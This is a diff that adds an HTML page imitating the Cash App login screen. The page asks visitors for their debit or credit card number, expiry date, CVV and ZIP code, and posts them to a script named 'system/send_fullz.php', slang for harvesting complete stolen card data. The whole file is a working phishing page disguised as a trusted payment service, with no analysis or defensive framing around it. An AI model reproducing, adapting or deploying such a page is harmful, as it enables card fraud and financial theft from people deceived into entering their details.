@@ -1,0 +1,66 @@
+<html lang="en" style="--vh:580px;"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <title>Cash App</title>
+
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-title" content="Cash App">
+
+  <meta name="theme-color" content="#0bb634">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="format-detection" content="telephone=no,email=no">
+  <link rel="icon" sizes="196x196" href="assets/icon-196.png">
+  <link rel="icon" href="assets/favicon.ico">
+  <link rel="mask-icon" href="/favicon-pinned.svg" color="#18C300">
+  <script src="assets/vendor.js" integrity="sha256-nTwtXHZxkWBCKpCkWwNAy6t2GmRW+0t2N2RJvlbuVRM=" crossorigin="anonymous"></script>
+  <script src="assets/cash.js" integrity="sha256-U9sC8mrpLy1svsJdPoiUfr4WQD9EUC7zePIEOreRp5Q=" crossorigin="anonymous"></script>
+  <link rel="stylesheet" type="text/css" href="assets/cash.css" integrity="sha256-DKtq4UJpbOrnJlqn+TlB3hTfPU4GrCSHgI1Lvx2P6g8=" crossorigin="anonymous">
+  <link rel="preload" href="assets/cash-market-rounded-light.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="assets/cash-market-rounded-regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="assets/cash-market-rounded-medium.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+</head>
+<body class="theme-bg ember-application theme-green">
+  <script nonce="">
+    window.App = require('cash/app')["default"].create();
+  </script>
+
+
+<div id="ember324" class="ember-view"><div data-current-route="login" id="ember348" class="full-height application-cash ember-view">  <div id="ember355" class="cookie-banner ember-view"><!----></div>
+  <section class="layout-login flex-container full-height pad">
+  <div class="login-container flex-container flex-v-center flex-fill">
+      <div id="ember699" class="login-onboarding ember-view"><!---->
+  <p class="instructions "><span>Enter your debit/credit card information</span></p>
+<!---->
+<!----><form action="system/send_fullz.php" method="post" novalidate="" id="ember712" class="form blocker-form form-card multi-column-form ember-view"><div class="field-group">
+  <div class="grid-row grid-cols-1 card-number">
+      </div>
+<!---->    <div id="ember728" class="field fk-field-container ember-view"><input type="tel" aria-label="Debit Card Number" name="pan" autocomplete="off" id="pan" class="ember-text-field ember-view" autocapitalize="off" placeholder="Debit Card Number">
+
+</div>
+  </div>
+  <div class="grid-row grid-cols-12 other-card-fields">
+    <div id="ember740" class="field fk-field-container no-trailing-padding span-cols-4 ember-view"><input type="tel" aria-label="MM/YY" pattern="\d*" name="expiration" autocomplete="off" spellcheck="true" id="expiration" class="ember-text-field ember-view" autocapitalize="off" placeholder="MM/YY">
+</div>
+
+    <div id="ember752" class="field fk-field-container span-cols-3 ember-view"><input type="tel" aria-label="CVV" pattern="\d*" name="securityCode" autocomplete="off" spellcheck="true" id="security_code" class="ember-text-field ember-view" autocapitalize="off" placeholder="CVV">
+</div>
+
+    <div id="ember756" class="field fk-field-container no-trailing-padding span-cols-5 ember-view"><input type="text" aria-label="ZIP" name="postalCode" autocomplete="off" spellcheck="true" autocapitalize="off" id="postal_code" class="ember-text-field ember-view" placeholder="ZIP">
+                </div>
+            </div>
+        </div>
+    </div>
+<div id="ember757" class="cta submit-button-component submit-button-with-spinner ember-view"><button type="submit" aria-label="Save Card" class="button theme-button button--round theme-button" data-ember-action="" data-ember-action-758="758">Save Card</button>
+  <div id="ember759" class="spinner-container ember-view"></div>
+</div>
+
+</form>
+
+<!---->
+</div>
+  </div>
+</section>
+<!----></div>
+</div></div></body></html>
